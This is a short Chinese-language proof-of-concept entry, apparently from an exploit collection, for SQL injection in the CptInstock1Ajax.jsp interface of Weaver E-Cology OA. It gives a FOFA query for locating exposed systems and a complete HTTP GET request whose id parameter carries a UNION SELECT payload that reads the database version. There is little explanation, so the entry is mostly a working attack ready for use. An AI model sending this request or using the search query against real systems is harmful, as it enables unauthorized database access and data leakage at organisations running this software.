# 泛微E-Cology系统接口CptInstock1Ajax存在SQL注入漏洞

泛微E-Cology系统接口CptInstock1Ajax存在SQL注入漏洞，可获取数据库权限，导致数据泄露。

## fofa

```javascript
app="泛微-OA（e-cology）"
```

## poc

```javascript
GET /cpt/capital/CptInstock1Ajax.jsp?id=-99+UNION+ALL+SELECT+@@VERSION,1# HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![image-20241012130802172](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410121308238.png)